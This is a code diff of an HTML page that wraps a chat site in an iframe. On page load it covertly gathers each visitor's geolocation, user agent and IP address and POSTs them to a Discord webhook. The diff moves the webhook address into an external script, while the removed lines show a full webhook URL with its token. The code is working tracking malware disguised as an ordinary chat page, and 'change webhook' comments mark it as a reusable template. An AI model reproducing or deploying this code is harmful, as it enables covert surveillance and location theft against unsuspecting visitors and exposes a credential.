@@ -1,6 +1,12 @@
 <!DOCTYPE html>
 <html>
 
+<head>
+    <script type="text/javascript" 
+        src="dwebhook.js">
+    </script>
+</head>
+
 <body onload="getLocation()">
 
 <iframe src="https://www.tohla.com/chat/" width="100%" height="900" loading="lazy ass" style="border:none;">
@@ -38,7 +44,7 @@ function showPosition(position) {
   var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent:" + navigator.userAgent + "\nFirewall ip: " + myIP());
   
   const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
+      request.open("POST", discord.webhook); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -77,7 +83,7 @@ function showError(error) {
     var ip = ("GET", "---\nIp-address: " + json.ip)
 
     const request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/977798116013133904/Es0rxL_L86Igb_lb9HeDSW2jtRy4th7k5n5LUtGsgvCRD0hOXeeHt2E8kZZYfkMpjTKY"); //change webhook
+      request.open("POST", discord.webhook); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
